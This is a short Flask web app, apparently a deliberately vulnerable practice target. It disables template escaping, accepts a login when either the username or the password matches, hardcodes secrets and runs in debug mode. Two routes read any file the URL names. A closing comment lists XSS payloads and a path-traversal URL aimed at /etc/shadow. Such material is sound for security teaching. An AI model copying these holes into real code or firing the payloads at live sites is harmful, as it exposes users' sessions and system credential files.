
from flask import *
app = Flask(__name__)
app.jinja_env.autoescape = False
SECRET_KEY = 'Chocolate chip cookies'
posts = ["My first blog"]

@app.route('/', methods=['GET', 'POST'])

def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] == "fish" or request.form['password'] == 'chips':
            return redirect(url_for('user_data', user="user1"))
        else:
            error = "Wrong username or password, dude"

    return render_template("login.html", error=error)

@app.route('/blog')

def blog(name=None):
    resp = make_response(render_template("secret.html", posts=posts))
    resp.set_cookie('secret key', '1234567')
    return resp

@app.route("/get_file/<path:infile>")
def get_file(infile):
    with open(infile, "r") as f:
        text = f.read()

    return text

@app.route("/user_data/<user>")
def user_data(user):
    with open(user, "r") as f:
        text = f.read()

    return text

@app.route('/add', methods=['POST'])
def add():
    blogRead = request.form['post']
    posts.append(blogRead)

    #neeeded, else complains
    return redirect(url_for('blog'))    


if __name__ == "__main__":
    app.run("0.0.0.0",debug = True)

'''

<script>alert('You been hacked!');</script>



<script>
alert(document.cookie);
</script>

http://127.0.0.1:5000/get_file/..%2f/etc/shadowc
'''